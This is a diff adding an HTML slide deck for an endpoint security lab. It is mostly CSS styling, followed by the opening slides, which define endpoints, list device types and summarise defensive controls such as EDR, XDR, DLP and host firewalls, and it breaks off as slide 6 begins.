+    .slide.active .agent-node { animation: agentPulse 2.2s ease-in-out infinite; }
+    .slide.active .agent-node:nth-child(1) { animation-delay: 0s; }
+    .slide.active .agent-node:nth-child(2) { animation-delay: 0.4s; }
+    .slide.active .agent-node:nth-child(3) { animation-delay: 0.8s; }
+
+    /* ===== Email Agent Flow Layout ===== */
+    .agent-flow { display: flex; align-items: center; justify-content: center; gap: 0; margin-top: 1.4em; flex-wrap: wrap; }
+    .agent-node {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 14px;
+      padding: 1.1em 1.3em; text-align: center; min-width: 150px;
+      box-shadow: var(--shadow-sm);
+    }
+    .agent-node .agent-icon { width: 40px; height: 40px; border-radius: 10px; margin: 0 auto 0.6em; display: flex; align-items: center; justify-content: center; }
+    .agent-node h5 { font-family: var(--font-heading); font-size: 0.92rem; font-weight: 700; color: var(--text-primary); margin-bottom: 0.2em; }
+    .agent-node .agent-full { font-family: var(--font-mono); font-size: 0.62rem; color: var(--text-dim); letter-spacing: 0.02em; margin-bottom: 0.4em; }
+    .agent-node p { font-size: 0.78rem; color: var(--text-muted); line-height: 1.5; margin: 0; }
+    .agent-arrow { font-size: 1.4rem; color: var(--blue-600); padding: 0 0.5em; flex-shrink: 0; }
+
+    /* ===== Email Anatomy Diagram ===== */
+    .email-mockup {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 14px;
+      box-shadow: var(--shadow-md); margin-top: 1.2em; overflow: hidden;
+    }
+    .email-mockup-part {
+      padding: 0.85em 1.3em; border-bottom: 1px solid var(--border);
+      position: relative; transition: background 0.25s ease;
+    }
+    .email-mockup-part:last-child { border-bottom: none; }
+    .email-mockup-part:hover { background: rgba(53,99,233,0.06); }
+    .email-mockup-part .part-label {
+      position: absolute; top: 0.6em; right: 1.1em;
+      font-family: var(--font-mono); font-size: 0.6rem; letter-spacing: 0.06em;
+      padding: 0.15em 0.55em; border-radius: 5px;
+    }
+    .part-label--header { background: rgba(53,99,233,0.15); color: var(--blue-200); }
+    .part-label--body   { background: rgba(124,58,237,0.15); color: var(--purple-200); }
+    .part-label--url     { background: rgba(34,197,94,0.12); color: #86efac; }
+    .part-label--attach   { background: rgba(245,158,11,0.12); color: #fcd34d; }
+    .email-mockup-part .mock-line { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-secondary); margin-bottom: 0.3em; }
+    .email-mockup-part .mock-line strong { color: var(--text-primary); }
+    .email-mockup-part .mock-body-text { font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6; }
+    .email-mockup-part .mock-link { color: var(--blue-300); text-decoration: underline; font-family: var(--font-mono); font-size: 0.78rem; }
+    .email-mockup-part .mock-attach-chip {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: rgba(251,191,36,0.1); border: 1px solid rgba(251,191,36,0.2);
+      border-radius: 8px; padding: 0.4em 0.8em; font-family: var(--font-mono); font-size: 0.72rem; color: #fcd34d;
+    }
+
+    /* ===== Address anatomy ===== */
+    .addr-anatomy { display: flex; justify-content: center; align-items: flex-end; gap: 4px; margin-top: 1.6em; flex-wrap: wrap; }
+    .addr-part { display: flex; flex-direction: column; align-items: center; gap: 0.5em; }
+    .addr-part .addr-chip {
+      font-family: var(--font-mono); font-size: 1.3rem; font-weight: 600;
+      padding: 0.3em 0.5em; border-radius: 8px;
+    }
+    .addr-chip--local { background: rgba(53,99,233,0.15); color: var(--blue-200); border: 1px solid rgba(53,99,233,0.25); }
+    .addr-chip--at     { background: transparent; color: var(--text-dim); font-size: 1.3rem; padding: 0; }
+    .addr-chip--domain { background: rgba(124,58,237,0.15); color: var(--purple-200); border: 1px solid rgba(124,58,237,0.25); }
+    .addr-chip--tld    { background: rgba(34,197,94,0.12); color: #86efac; border: 1px solid rgba(34,197,94,0.2); }
+    .addr-part .addr-tag { font-family: var(--font-mono); font-size: 0.62rem; color: var(--text-muted); letter-spacing: 0.04em; }
+
+    /* ---- Image/Screenshot Placeholder ---- */
+    .screenshot-placeholder {
+      width: 100%; height: 260px;
+      border: 2px dashed var(--border-glow); border-radius: 12px;
+      background: rgba(8, 12, 24, 0.4);
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      gap: 12px; padding: 20px; text-align: center;
+      color: var(--text-muted); transition: all 0.3s ease;
+      cursor: pointer; position: relative; overflow: hidden;
+    }
+    .screenshot-placeholder:hover { border-color: var(--blue-400); background: rgba(8, 12, 24, 0.6); color: var(--blue-300); }
+    .screenshot-placeholder-icon { color: var(--blue-500); opacity: 0.6; display: flex; align-items: center; justify-content: center; }
+    .screenshot-placeholder-icon svg { width: 34px; height: 34px; }
+    .screenshot-placeholder-text { font-family: var(--font-mono); font-size: 0.72rem; letter-spacing: 0.04em; max-width: 280px; line-height: 1.45; }
+
+    /* ===== Icon inline ===== */
+    .icon-inline { display: inline-flex; align-items: center; justify-content: center; vertical-align: -3px; }
+    .icon-inline svg { width: 1em; height: 1em; }
+
+    /* ===== Protocol Header Diagram ===== */
+    .hdr-diagram {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1.5px solid rgba(124,58,237,0.45); border-radius: 14px;
+      box-shadow: var(--shadow-md), 0 0 0 1px rgba(124,58,237,0.08); overflow: hidden; margin-top: 1.2em;
+    }
+    .hdr-row { display: flex; border-bottom: 1px solid rgba(53,99,233,0.28); }
+    .hdr-row:last-child { border-bottom: none; }
+    .hdr-field {
+      flex: 1 1 0; padding: 0.65em 0.5em; text-align: center;
+      border-right: 1px solid rgba(124,58,237,0.35); position: relative;
+    }
+    .hdr-field:last-child { border-right: none; }
+    .hdr-field--blue   { background: rgba(53,99,233,0.09); }
+    .hdr-field--purple { background: rgba(124,58,237,0.09); }
+    .hdr-field .fname { display: block; font-family: var(--font-heading); font-weight: 600; font-size: 0.78rem; color: var(--text-primary); line-height: 1.3; }
+    .hdr-field .fbits { display: block; font-family: var(--font-mono); font-size: 0.62rem; color: var(--text-muted); margin-top: 0.2em; letter-spacing: 0.02em; }
+
+    /* ===== Field Definitions List ===== */
+    .field-defs { display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.55em 1.6em; margin-top: 1.1em; }
+    .field-def { font-size: 0.85rem; color: var(--text-muted); line-height: 1.55; }
+    .field-def .fd-term { display: inline-block; font-family: var(--font-mono); font-size: 0.78rem; font-weight: 600; color: var(--blue-300); margin-right: 0.45em; }
+
+    /* ===== Port Range Diagram ===== */
+    .port-range-bar { display: flex; margin-top: 1.4em; border-radius: 10px; overflow: hidden; box-shadow: var(--shadow-md); border: 1px solid var(--border-glow); }
+    .port-range-seg { flex: 1; padding: 1em 0.8em; text-align: center; position: relative; }
+    .port-range-seg--1 { background: rgba(53,99,233,0.16); border-right: 1px solid rgba(124,58,237,0.3); }
+    .port-range-seg--2 { background: rgba(124,58,237,0.14); border-right: 1px solid rgba(124,58,237,0.3); }
+    .port-range-seg--3 { background: rgba(53,99,233,0.09); }
+    .port-range-seg .pr-range { display: block; font-family: var(--font-mono); font-weight: 700; font-size: 0.95rem; color: var(--text-primary); }
+    .port-range-seg .pr-name { display: block; font-family: var(--font-heading); font-weight: 600; font-size: 0.82rem; margin-top: 0.35em; color: var(--blue-200); }
+    .port-range-seg .pr-desc { display: block; font-size: 0.75rem; color: var(--text-muted); margin-top: 0.35em; line-height: 1.5; }
+
+    /* ===== Port List Grid ===== */
+    .port-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 0.65em 1.8em; margin-top: 1.1em; }
+    .port-entry { display: flex; align-items: flex-start; gap: 0.7em; }
+    .port-chip {
+      flex-shrink: 0; font-family: var(--font-mono); font-weight: 700; font-size: 0.78rem;
+      padding: 0.22em 0.55em; border-radius: 6px; min-width: 2.6em; text-align: center;
+    }
+    .port-chip--blue   { background: rgba(53,99,233,0.16);  color: var(--blue-200);   border: 1px solid rgba(53,99,233,0.25); }
+    .port-chip--purple { background: rgba(124,58,237,0.16); color: var(--purple-200); border: 1px solid rgba(124,58,237,0.25); }
+    .port-info .pname { display: block; font-family: var(--font-heading); font-weight: 600; font-size: 0.86rem; color: var(--text-primary); }
+    .port-info .pdesc { display: block; font-size: 0.76rem; color: var(--text-muted); line-height: 1.5; margin-top: 0.15em; }
+
+    /* ===== Handshake Sequence Diagram ===== */
+    .handshake-diagram { margin-top: 1.3em; }
+    .hs-lane-labels { display: flex; justify-content: space-between; padding: 0 4%; margin-bottom: 0.4em; }
+    .hs-lane-labels span { font-family: var(--font-heading); font-weight: 700; font-size: 0.95rem; color: var(--text-primary); }
+
+    /* ===== Packet Capture Demo Table ===== */
+    .capture-table {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border-glow); border-radius: 14px;
+      box-shadow: var(--shadow-md); margin-top: 1.2em; overflow: hidden;
+      font-family: var(--font-mono);
+    }
+    .capture-row {
+      display: grid; grid-template-columns: 34px 68px 108px 108px 62px 1fr;
+      gap: 10px; padding: 0.6em 1em; align-items: center;
+      border-bottom: 1px solid rgba(53,99,233,0.2);
+      font-size: 0.74rem; color: var(--text-secondary);
+    }
+    .capture-row:last-child { border-bottom: none; }
+    .capture-row--head {
+      background: rgba(53,99,233,0.08); color: var(--text-muted);
+      text-transform: uppercase; letter-spacing: 0.06em; font-size: 0.62rem;
+      font-family: var(--font-body); font-weight: 600;
+    }
+    .capture-row:not(.capture-row--head):hover { background: rgba(53,99,233,0.06); }
+    .cap-flag { display: inline-block; padding: 0.1em 0.5em; border-radius: 5px; font-weight: 700; font-size: 0.7rem; }
+    .cap-flag--syn { background: rgba(53,99,233,0.2); color: var(--blue-200); }
+    .cap-flag--synack { background: rgba(124,58,237,0.2); color: var(--purple-200); }
+    .cap-flag--ack { background: rgba(52,211,153,0.16); color: var(--accent-green); }
+
+    /* ===== Example Box ===== */
+    .example-box {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 14px;
+      box-shadow: var(--shadow-md); margin-top: 1.2em; padding: 1.1em 1.3em;
+    }
+    .example-box .example-label {
+      display: inline-block; font-family: var(--font-mono); font-size: 0.62rem;
+      letter-spacing: 0.08em; padding: 0.22em 0.6em; border-radius: 5px;
+      background: rgba(34,197,94,0.12); color: #86efac; margin-bottom: 0.75em;
+    }
+    .example-box .mock-line { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-secondary); margin-bottom: 0.3em; }
+    .example-box .mock-line strong { color: var(--text-primary); }
+    .example-box .mock-body-text { font-size: 0.85rem; color: var(--text-secondary); line-height: 1.6; }
+    .example-box .mock-body-text em { color: var(--text-primary); font-style: normal; font-weight: 600; }
+
+    /* ===== Terminal / tcpdump Mockup ===== */
+    .terminal {
+      background: rgba(3, 5, 10, 0.9); border: 1px solid var(--border-glow);
+      border-radius: 12px; box-shadow: var(--shadow-md); margin-top: 1.2em; overflow: hidden;
+    }
+    .terminal-bar { display: flex; align-items: center; gap: 6px; padding: 0.6em 1em; background: rgba(255,255,255,0.03); border-bottom: 1px solid var(--border); }
+    .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .terminal-dot--red { background: #f87171; }
+    .terminal-dot--amber { background: #fbbf24; }
+    .terminal-dot--green { background: #34d399; }
+    .terminal-label { margin-left: 8px; font-family: var(--font-mono); font-size: 0.68rem; color: var(--text-muted); }
+    .terminal-body { padding: 1em 1.3em; font-family: var(--font-mono); font-size: 0.76rem; line-height: 1.75; color: var(--text-secondary); overflow-x: auto; }
+    .terminal-body::-webkit-scrollbar { height: 8px; }
+    .terminal-body::-webkit-scrollbar-track { background: rgba(255,255,255,0.03); border-radius: 4px; }
+    .terminal-body::-webkit-scrollbar-thumb { background: linear-gradient(90deg, #3563e9, #7c3aed); border-radius: 4px; }
+    .terminal-body::-webkit-scrollbar-thumb:hover { background: linear-gradient(90deg, #4a78f0, #a87bf5); }
+    .terminal-body { scrollbar-width: thin; scrollbar-color: #7c3aed rgba(255,255,255,0.03); }
+    .terminal-body .t-prompt { color: var(--accent-green); }
+    .terminal-body .t-cmd { color: var(--text-primary); }
+    .terminal-body .t-line { white-space: pre; }
+    .terminal-body .t-comment { color: var(--text-dim); }
+
+    /* ===== Compact lists inside cards ===== */
+    .card ul { margin-top: 0.35em; }
+    .card ul li { font-size: 0.83rem; color: var(--text-muted); padding-left: 1.5em; margin-bottom: 0.4em; line-height: 1.5; }
+    .card ul li::before { width: 8px; height: 8px; top: 0.4em; }
+    .card ul li::after { top: calc(0.4em + 3px); }
+
+    /* ===== Process Tree Diagram ===== */
+    .proc-tree { margin-top: 1.3em; }
+    .proc-node {
+      display: flex; align-items: center; gap: 12px;
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border); border-radius: 10px;
+      padding: 0.6em 1em; margin-bottom: 8px; box-shadow: var(--shadow-sm);
+      transition: all 0.3s ease;
+    }
+    .proc-node:hover { border-color: var(--border-glow); box-shadow: var(--shadow-md); }
+    .proc-node.flagged { border-color: rgba(248,113,113,0.4); box-shadow: 0 0 0 1px rgba(248,113,113,0.12); }
+    .proc-children { margin-left: 2.1em; padding-left: 1.2em; border-left: 2px dashed var(--border); }
+    .proc-icon {
+      width: 32px; height: 32px; border-radius: 8px; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .proc-name { font-family: var(--font-mono); font-weight: 600; font-size: 0.85rem; color: var(--text-primary); }
+    .proc-meta { font-family: var(--font-mono); font-weight: 400; font-size: 0.66rem; color: var(--text-muted); margin-left: 0.5em; }
+    .proc-cmdline { font-family: var(--font-mono); font-size: 0.68rem; color: var(--text-dim); margin-top: 3px; word-break: break-all; }
+    .proc-tag { margin-left: auto; flex-shrink: 0; }
+
+    /* ===== Key-Value Info Table (process detail cards) ===== */
+    .info-table {
+      background: var(--gradient-card); backdrop-filter: blur(16px);
+      border: 1px solid var(--border-glow); border-radius: 14px;
+      box-shadow: var(--shadow-md); margin-top: 1.2em; overflow: hidden;
+    }
+    .info-table-row { display: grid; grid-template-columns: 200px 1fr; border-bottom: 1px solid var(--border); transition: background 0.25s ease; }
+    .info-table-row:last-child { border-bottom: none; }
+    .info-table-row:hover { background: rgba(53,99,233,0.06); }
+    .info-table-label {
+      padding: 0.75em 1.2em; font-family: var(--font-heading); font-weight: 700;
+      font-size: 0.86rem; color: var(--blue-300);
+      background: rgba(53,99,233,0.07); border-right: 1px solid var(--border);
+      display: flex; align-items: center;
+    }
+    .info-table-value { padding: 0.75em 1.2em; font-size: 0.86rem; color: var(--text-secondary); display: flex; align-items: center; flex-wrap: wrap; gap: 0.4em; }
+    .info-table-value .dim { font-size: 0.92em; }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 768px) {
+      .slide { padding: 60px 24px; }
+      h1 { font-size: 2rem; }
+      h2 { font-size: 1.4rem; }
+      .slide--title h1 { font-size: 2.2rem; }
+      .card-row, .card-row--2, .card-row--3, .card-row--4 { grid-template-columns: 1fr; }
+      .flow { flex-direction: column; align-items: flex-start; }
+      .flow-arrow { transform: rotate(90deg); }
+      .two-col { grid-template-columns: 1fr; }
+      .cycle-row { flex-direction: column; border-radius: 14px; }
+      .cycle-item { border-right: none; border-bottom: 1px solid var(--border); }
+      .cycle-item:last-child { border-bottom: none; }
+      .benefit-grid { grid-template-columns: 1fr; }
+      .case-stat-row { grid-template-columns: 1fr; }
+      .agent-flow { flex-direction: column; }
+      .agent-arrow { transform: rotate(90deg); }
+      .addr-anatomy { flex-direction: column; }
+      .field-defs { grid-template-columns: 1fr; }
+      .hdr-field .fname { font-size: 0.68rem; }
+      .hdr-field .fbits { font-size: 0.56rem; }
+      .port-range-bar { flex-direction: column; }
+      .port-range-seg--1, .port-range-seg--2 { border-right: none; border-bottom: 1px solid rgba(124,58,237,0.3); }
+      .port-grid { grid-template-columns: 1fr; }
+      .capture-row { grid-template-columns: 24px 60px 90px 90px 54px 1fr; font-size: 0.64rem; gap: 6px; padding: 0.55em 0.6em; }
+      .proc-children { margin-left: 1em; padding-left: 0.7em; }
+      .proc-node { flex-wrap: wrap; }
+      .proc-tag { margin-left: 0; }
+      .info-table-row { grid-template-columns: 1fr; }
+      .info-table-label { border-right: none; border-bottom: 1px solid var(--border); }
+    }
+  
+    /* ===== Speaker Notes Overlay ===== */
+    #speaker-notes-overlay {
+      position: fixed;
+      bottom: 58px;
+      right: 24px;
+      width: 480px;
+      max-width: calc(100vw - 48px);
+      max-height: 420px;
+      background: rgba(7, 10, 20, 0.96);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid var(--border-glow);
+      border-radius: 12px;
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.65), 0 0 24px rgba(53, 99, 233, 0.2);
+      z-index: 99999 !important;
+      display: none;
+      flex-direction: column;
+      overflow: hidden;
+      animation: notesFadeIn 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    #speaker-notes-overlay.active { display: flex !important; }
+    @keyframes notesFadeIn {
+      from { opacity: 0; transform: translateY(12px) scale(0.97); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .notes-header {
+      padding: 10px 14px;
+      background: linear-gradient(90deg, rgba(53, 99, 233, 0.18), rgba(124, 58, 237, 0.18));
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .notes-title {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--blue-200);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .notes-close {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      font-size: 1.15rem;
+      padding: 0 4px;
+      transition: color 0.2s ease;
+      line-height: 1;
+    }
+    .notes-close:hover { color: var(--accent-red); }
+    .notes-body {
+      padding: 16px;
+      overflow-y: auto;
+      font-size: 0.95rem;
+      line-height: 1.65;
+      color: var(--text-primary);
+      font-family: var(--font-body);
+    }
+    .notes-empty { color: var(--text-muted); font-style: italic; }
+    .nav-btn--notes {
+      width: auto !important;
+      padding: 0 10px !important;
+      gap: 6px;
+      font-weight: 600;
+      font-size: 0.78rem !important;
+    }
+    .nav-btn--notes.active {
+      background: var(--blue-600) !important;
+      color: #fff !important;
+      border-color: var(--blue-400) !important;
+      box-shadow: 0 0 12px rgba(53, 99, 233, 0.5) !important;
+    }
+
+  </style>
+<body>
+
+  <!-- ===== Background ===== -->
+  <div class="orb orb--1"></div>
+  <div class="orb orb--2"></div>
+  <div class="orb orb--3"></div>
+
+  <div class="circuit-bg">
+    <svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
+      <pattern id="circuit" x="0" y="0" width="200" height="200" patternUnits="userSpaceOnUse">
+        <path d="M0 100 h60 v-40 h30 v40 h20 v-60 h30" fill="none" stroke="#4a78f0" stroke-width="1"/>
+        <path d="M180 0 v50 h-40 v30 h40 v30" fill="none" stroke="#4a78f0" stroke-width="1"/>
+        <circle cx="60" cy="100" r="3" fill="#4a78f0"/>
+        <circle cx="90" cy="60"  r="2.5" fill="#7c3aed"/>
+        <circle cx="140" cy="100" r="3" fill="#4a78f0"/>
+        <circle cx="140" cy="50"  r="2.5" fill="#7c3aed"/>
+        <rect x="108" y="95" width="6" height="10" rx="1" fill="none" stroke="#4a78f0" stroke-width="0.8"/>
+      </pattern>
+      <rect width="100%" height="100%" fill="url(#circuit)" />
+    </svg>
+  </div>
+
+  <div class="shield-watermark">
+    <svg width="320" height="380" viewBox="0 0 100 120" fill="none">
+      <path d="M50 5 L90 25 L90 60 Q90 95 50 115 Q10 95 10 60 L10 25 Z" stroke="#4a78f0" stroke-width="1.5" fill="none"/>
+      <path d="M50 18 L78 33 L78 58 Q78 84 50 100 Q22 84 22 58 L22 33 Z" stroke="#7c3aed" stroke-width="0.8" fill="none"/>
+      <path d="M38 58 L48 68 L65 48" stroke="#4a78f0" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+
+  <div class="side-accent"></div>
+
+  <!-- Top Header -->
+  <div class="top-header">
+    <div class="header-title">
+      <span class="title-dot"></span>
+      <span>Incident Detection &amp; Response</span>
+      <span class="title-sep">—</span>
+      <span id="header-slide-title">Endpoint Security</span>
+    </div>
+    <div class="header-right">
+      <span class="lab-badge">LAB 07-08</span>
+    </div>
+  </div>
+
+  <div id="progress-bar"></div>
+
+  <!-- ===== SLIDES ===== -->
+  <div id="presentation">
+
+    <!-- ==========================================
+         SLIDE 1 — Cover
+         ========================================== -->
+    <div class="slide slide--title active" data-slide="0" data-title="Introduction"
+         data-notes="Welcome students to the Endpoint Security domain. This shifts focus from the network itself to the devices sitting at the edges of it — where users work and where attackers most often try to land.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> INCIDENT DETECTION &amp; RESPONSE</div>
+        <h1>Endpoint<br /><span class="gradient-text">Security</span></h1>
+        <p class="subtitle">Understanding endpoints, the controls that protect them, and how to read system internals to detect an attacker who's already inside.</p>
+        <div class="divider"></div>
+        <div class="instructor-line">Lab 07 &amp; 08 – <span>Endpoint Detection and Monitoring</span></div>
+        <div class="instructor-line">Instructor: <span>Hussein Al-Selwi</span></div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 2 — Domain Objectives
+         ========================================== -->
+    <div class="slide" data-slide="1" data-title="Domain Objectives"
+         data-notes="Walk through each objective briefly. Emphasize the progression: understand fundamentals, then explore endpoint types and controls, then get into OS internals, then apply that to real system investigation, then finally deploy a working EDR solution.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> LECTURE OVERVIEW</div>
+        <h2>Domain Objectives</h2>
+        <ul style="margin-top: 1em;">
+          <li>Understand the fundamentals of <strong class="blue">endpoint security monitoring</strong></li>
+          <li>Explore endpoint <strong class="purple">types</strong>, <strong class="blue">controls</strong>, and <strong class="purple">detection strategies</strong></li>
+          <li>Understand core operating system <strong class="blue">components</strong> and their <strong class="purple">functions</strong></li>
+          <li>Develop practical skills in <strong class="blue">extracting insights</strong> from <strong class="purple">system internals</strong></li>
+          <li><strong class="blue">Deploy</strong> and <strong class="purple">configure</strong> a unified <strong class="blue">endpoint detection solution</strong></li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 3 — Introduction to Endpoint Security
+         ========================================== -->
+    <div class="slide" data-slide="2" data-title="What Is Endpoint Security?"
+         data-notes="Set up the domain conceptually before getting into definitions and types. The core idea: endpoints are where users work and where attackers land, so they're both the most common entry point and the richest source of evidence when something goes wrong.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> INTRODUCTION</div>
+        <h2>Protecting Where Users and Data Actually Live</h2>
+        <p>Endpoints are the doors into an organization — the laptops, phones, servers, and devices where people work and where attackers ultimately try to land. <strong class="blue">Endpoint security</strong> is the practice of protecting these devices from compromise, and closely watching them so that attacks which do get through can still be caught in the act.</p>
+
+        <div class="card-row card-row--3" style="margin-top: 1.1em;">
+          <div class="card">
+            <div class="card-icon card-icon--red"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 9v4"/><path d="M12 17h.01"/><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/></svg></div>
+            <h4>The Common Entry Point</h4>
+            <p>Phishing links, malicious attachments, and exploited software most often land on an endpoint first.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/></svg></div>
+            <h4>Closest to the Evidence</h4>
+            <p>Every process, file, and connection an attacker touches leaves a trace on the endpoint itself.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a87bf5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="7" width="20" height="14" rx="2" ry="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg></div>
+            <h4>Hard to Fully Control</h4>
+            <p>Devices are numerous, diverse, and often mobile — making consistent protection a real challenge.</p>
+          </div>
+        </div>
+
+        <div class="info-box" style="margin-top: 1.2em;">
+          <div class="info-box-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4"/><path d="M12 8h.01"/></svg></div>
+          <p><strong>The goal:</strong> not just preventing compromise, but maintaining enough visibility into every endpoint that an intrusion can be detected and stopped before it achieves its objective.</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 4 — What Is an Endpoint? / Types
+         ========================================== -->
+    <div class="slide" data-slide="3" data-title="What Is an Endpoint?"
+         data-notes="Define endpoint clearly, then walk through the four main categories. Emphasize that despite being very different devices, they all run an OS, execute code, and generate the same broad categories of telemetry that we'll monitor later.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> ENDPOINT FUNDAMENTALS</div>
+        <h2>What Is an Endpoint?</h2>
+        <p>An <strong class="blue">endpoint</strong> is any device that connects to and communicates over a network — the physical hardware where code actually executes and data is actually accessed, which makes it something both defenders and attackers care about.</p>
+
+        <div class="card-row card-row--4" style="margin-top: 1.1em;">
+          <div class="card">
+            <div class="card-icon card-icon--blue"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b93f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div>
+            <h4>Workstations</h4>
+            <p>Desktops and laptops used for daily work — the most common device, and a frequent phishing target.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--purple"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#a87bf5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg></div>
+            <h4>Mobile Devices</h4>
+            <p>Phones and tablets that move across networks constantly, often outside direct organizational control.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--green"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#34d399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg></div>
+            <h4>Servers</h4>
+            <p>Always-on systems hosting applications and data — high-value targets that rarely go offline.</p>
+          </div>
+          <div class="card">
+            <div class="card-icon card-icon--amber"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg></div>
+            <h4>IoT Devices</h4>
+            <p>Cameras, sensors, and smart hardware — connected, but often limited in the security controls they support.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 5 — Endpoint Security Controls
+         ========================================== -->
+    <div class="slide" data-slide="4" data-title="Endpoint Security Controls"
+         data-notes="Group the controls into two families: controls that prevent and detect malicious activity directly on the endpoint, and controls that watch behavior and access at the network edge of the endpoint. Keep this focused on what each control does at a high level.">
+      <div class="slide-inner">
+        <div class="section-label"><span class="label-icon">◆</span> CONTROLS</div>
+        <h2>Endpoint Security Controls</h2>
+        <p>No single control catches everything — real endpoint protection layers several together, from signature-based prevention up to behavioral detection and response.</p>
+
+        <div class="two-col">
+          <div class="col-block col-block--blue">
+            <h4>Prevention &amp; Detection</h4>
+            <ul>
+              <li><strong class="blue">Antivirus / Antimalware</strong> — scans files and activity, matching known patterns and signatures.</li>
+              <li><strong class="blue">Endpoint Detection and Response (EDR)</strong> — agent-based, real-time monitoring and response across process, file, registry, and network activity.</li>
+              <li><strong class="blue">Extended Detection and Response (XDR)</strong> — integrates multiple controls and telemetry sources, with runbooks and automated response to routine threats.</li>
+              <li><strong class="blue">Data Loss Prevention (DLP)</strong> — protects sensitive data at rest, in transit, and in processing through access controls, masking, and prevention rules.</li>
+            </ul>
+          </div>
+          <div class="col-block col-block--purple">
+            <h4>Behavior &amp; Access Control</h4>
+            <ul>
+              <li><strong class="purple">User and Entity Behavior Analytics (UBA)</strong> — monitors user behavior patterns and flags deviations from a historic and contextual baseline, surfacing insider threats, account compromise, and data exfiltration.</li>
+              <li><strong class="purple">Host-based Firewall</strong> — controls incoming and outgoing traffic directly on the host.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==========================================
+         SLIDE 6 — Endpoint Security Monitoring
+         ========================================== -->
+    <div class="slide" data-slide="5" data-title="Endpoint Security Monitoring"
+         data-notes="Cover the four core categories of telemetry that endpoint monitoring is built on. These are the signal sources that everything in this domain — EDR, UBA, investigation — ultimately draws from.">
